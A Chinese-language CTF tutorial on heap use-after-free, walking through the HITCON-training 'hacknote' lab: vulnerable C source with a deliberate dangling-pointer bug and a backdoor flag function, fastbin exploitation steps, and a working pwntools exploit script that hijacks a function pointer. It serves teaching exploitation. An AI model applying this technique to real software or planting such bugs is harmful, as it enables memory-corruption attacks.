<template><div><p><a name="use_after_free"></a></p>
<h1 id="use-after-free" tabindex="-1"><a class="header-anchor" href="#use-after-free" aria-hidden="true">#</a> use_after_free</h1>
<p><a name="b6724cff"></a></p>
<h2 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h2>
<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
<p><a name="a0f671d4"></a></p>
<h2 id="hitcon-training-lab-10-hacknote" tabindex="-1"><a class="header-anchor" href="#hitcon-training-lab-10-hacknote" aria-hidden="true">#</a> HITCON-training lab 10 hacknote</h2>
<p>程序源码：</p>
<div class="language-c ext-c line-numbers-mode"><pre v-pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>printnote<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>content<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token operator">*</span>notelist<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">print_note_content</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token operator">*</span>this<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">puts</span><span class="token punctuation">(</span>this<span class="token operator">-></span>content<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">note</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">note</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>printnote <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
      notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>content<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      count<span class="token operator">++</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  idx <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> idx <span class="token operator">>=</span> count<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">-></span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> idx<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  idx <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> idx <span class="token operator">>=</span> count<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token operator">-></span><span class="token function">printnote</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"       HackNote       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 1. Add note          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 2. Delete note       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 3. Print note        "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" 4. Exit              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
      <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
      <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token operator">:</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a name="36bfad43"></a></p>
<h4 id="add-note-功能" tabindex="-1"><a class="header-anchor" href="#add-note-功能" aria-hidden="true">#</a> add note 功能：</h4>
<ol>
<li>申请一个八字节的内存用来存放put函数指针和content指针</li>
<li>根据输入的size值来申请内存，用来存放real content</li>
</ol>
<p>申请后的内存分布如图：<br /><img src="https://img-blog.csdnimg.cn/20210221163112702.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=e68k7&amp;originHeight=151&amp;originWidth=516&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>程序Delete note功能，只对内存进行了free，而没有将对应的指针置为NULL，导致use_after_free;<br /><img src="https://img-blog.csdnimg.cn/20210221163137289.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=q90Xg&amp;originHeight=126&amp;originWidth=411&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>存在后门函数：<br /><img src="https://img-blog.csdnimg.cn/20210221163156697.png#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=ElZ2m&amp;originHeight=37&amp;originWidth=429&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></p>
<p>程序Print note功能是通过指针函数调用函数的，<strong>一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。</strong></p>
<p><a name="1a7f5c22"></a></p>
<h3 id="利用思路" tabindex="-1"><a class="header-anchor" href="#利用思路" aria-hidden="true">#</a> 利用思路：</h3>
<ol>
<li>申请 note0，real content size 为 32，输入的content为“aaaa”（大小与 note 大小所在的 bin 不一样即可）<br /><img src="https://img-blog.csdnimg.cn/2021022116325585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=IPj2E&amp;originHeight=306&amp;originWidth=778&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li>
<li>申请 note1，real content size 为 32，输入的content为“bbbb”（大小与 note 大小所在的 bin 不一样即可）<br /><img src="https://img-blog.csdnimg.cn/20210221163326624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=znZWj&amp;originHeight=283&amp;originWidth=678&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li>
<li>释放 note0，内存会进入fastbin中，且content chunk和note chunk会进入不同的位置</li>
<li>释放 note1</li>
<li>此时，大小为 0x10 的 fast bin chunk 中链表为 note1-&gt;note0<br /><img src="https://img-blog.csdnimg.cn/20210221163405277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=Uokbf&amp;originHeight=720&amp;originWidth=871&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li>
<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则：<br />note2 其实会分配 note1 对应的内存块。<br />real content 对应的 chunk 其实是 note0。<br /><img src="https://img-blog.csdnimg.cn/20210221163502412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTk0MzUyMg==,size_16,color_FFFFFF,t_70#pic_center#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=OJXRc&amp;originHeight=651&amp;originWidth=867&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt="" loading="lazy"></li>
<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li>
</ol>
<p><a name="964d959d"></a></p>
<h3 id="利用脚本" tabindex="-1"><a class="header-anchor" href="#利用脚本" aria-hidden="true">#</a> 利用脚本：</h3>
<div class="language-python ext-py line-numbers-mode"><pre v-pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">addnote</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">delnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">printnote</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment">#gdb.attach(r)</span>
magic <span class="token operator">=</span> <span class="token number">0x08048986</span>

addnote<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">)</span> <span class="token comment"># add note 0</span>
addnote<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token string">"bbbb"</span><span class="token punctuation">)</span> <span class="token comment"># add note 1</span>

delnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># delete note 0</span>
delnote<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># delete note 1</span>

addnote<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>magic<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># add note 2</span>

printnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># print note 0</span>

r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div></template>


